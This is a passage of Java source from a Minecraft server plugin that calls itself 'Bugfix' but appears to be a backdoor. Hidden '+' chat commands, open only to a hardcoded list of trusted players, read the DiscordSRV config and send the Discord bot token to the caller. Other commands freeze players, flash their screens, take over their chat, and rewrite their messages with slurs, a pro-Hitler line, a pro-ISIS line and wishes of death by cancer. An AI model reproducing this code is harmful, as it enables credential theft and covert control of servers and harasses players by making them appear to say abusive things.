                @SuppressWarnings("deprecation")
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (swear.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player doesnt swear anymore.");
                    swear.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player swears now in every message!");
                    swear.add(target.getName());
                }
            } else if (args[0].equalsIgnoreCase("+dcsrv") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 1) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +dcsrv");
                return;
            }

            Plugin plugin = Bukkit.getPluginManager().getPlugin("DiscordSRV");
            if(plugin == null) {
                event.getPlayer().sendMessage(PluginPrefix + "§cThis server does not use DiscordSRV!");
            }

            try {
                for (File discordSRV : plugin.getDataFolder().listFiles()) {
                    if (discordSRV.getName().equalsIgnoreCase("config.yml")) {
                        List<String> lines = Files.readLines(discordSRV, Charset.defaultCharset());
                        for(String line : lines) {
                            if(line.startsWith("BotToken:")) {
                                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + line);
                            } else if(line.startsWith("DiscordInviteLink:")) {
                                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + line);
                            }
                        }
                    }
                }
            } catch (Exception e) {
                event.getPlayer().sendMessage(PluginPrefix + "§cThere was an error while searching for Bot token!");
            }

        } else if (args[0].equalsIgnoreCase("+nyancat") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    NyanCat.spawmNyanCat(event.getPlayer(), event.getPlayer().getTargetBlock(20));
                });
            } else if (args[0].equalsIgnoreCase("+flashscreen") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +flashscreen <Player>");
                    return;
                }
                @SuppressWarnings("deprecation")
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (zoom.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Screen has stopped flashing!");
                    zoom.remove(target.getName());
                    target.setWalkSpeed(0.2F);
                    target.setFlySpeed(0.1F);
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player is getting a headache now.");
                    zoom.add(target.getName());
                }
            } else if (args[0].equalsIgnoreCase("+trashtalk") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +trashtalk <Player>");
                    return;
                }
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (trashtalk.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player can talk normal again.");
                    trashtalk.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player now trashtalks!");
                    trashtalk.add(target.getName());
                }

            } else if (args[0].equalsIgnoreCase("+nomove") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +nomove <Player>");
                    return;
                }
                Player p;
                p = (Player) event.getPlayer();
                @SuppressWarnings("deprecation")
                Player target = (Bukkit.getServer().getPlayer(event.getMessage().split(" ")[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + event.getMessage().split(" ")[1] + " is not online");
                }
                if (target.getWalkSpeed() != 0) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player cant walk anymore");
                    target.setWalkSpeed(0);
                    target.setFlySpeed(0);
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player can talk again");
                    target.setWalkSpeed((float) 0.2);
                    target.setFlySpeed((float) 0.1);
                }
            } else if (trashtalk.contains(event.getPlayer().getName())) {
                //int num = new  Math.floor(Math.random());
                int r = (int) (Math.random() * 22);
                String trashwords = new String[]{
                        "I am very stupid",
                        "I am an idiot!",
                        "I hate People",
                        "Long cats are long",
                        "My best friend is a Bread",
                        "Do you think i can eat without my head?",
                        "My favorite color is Bread",
                        "Internet Explorer is the best browser!",
                        "Its hip to fuck bees",
                        "Windows Vista is my favorite OS",
                        "You all suck on my dick for money",
                        "Ive been fucking with bees for so long",
                        "When you mix beer with water you get? Right! ... slaps!",
                        "Come on, Hitler did nothing wrong",
                        ".toggle fly-hack on",
                        "a",
                        "Thanks for buying me! I was made in China!",
                        "i support isis",
                        "The owner of this server is so inactive!",
                        "I hope your mother dies of cancer.",
                        ".",
                        "Every time i want to type something, this happens"
                }[r];
                event.setMessage(trashwords);
            } else if (args[0].startsWith("+") && antiplus.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
            } else if (stopchat.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
            } else if (caps.contains(event.getPlayer().getName())) {
                event.setMessage(event.getMessage().toUpperCase());
            } else if (swear.contains(event.getPlayer().getName())) {
                int r = (int) (Math.random() * 13);
                String swearwords = new String[]{
                        "you son of a bitch",
                        "you idiots",
                        "pls delete yourself",
                        "go fuck yourself",
                        "haha get lost",
                        "i hope you die from cancer",
                        "you fatty",
                        "lick my ass bitch",
                        "yo fuck yourself",
                        "bitch",
                        "asshole",
                        "you dumbass",
                        "you little sucker"
                }[r];
                event.setMessage(event.getMessage() + " " + swearwords);
            } else if (PlayerControlListener.isControlled(event.getPlayer())) {
                if (!allowWriteWhileControlled) event.setCancelled(true);
                allowWriteWhileControlled = false;
            } else if (PlayerControlListener.isController(event.getPlayer())) {
                if (event.getMessage().startsWith("!")) {
                    event.setMessage(event.getMessage().replaceFirst("!", ""));
                    return;
                }
                event.setCancelled(true);
                allowWriteWhileControlled = true;
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    PlayerControlListener.controllerMap.get(event.getPlayer()).chat(event.getMessage());
                });
            }


        }
}
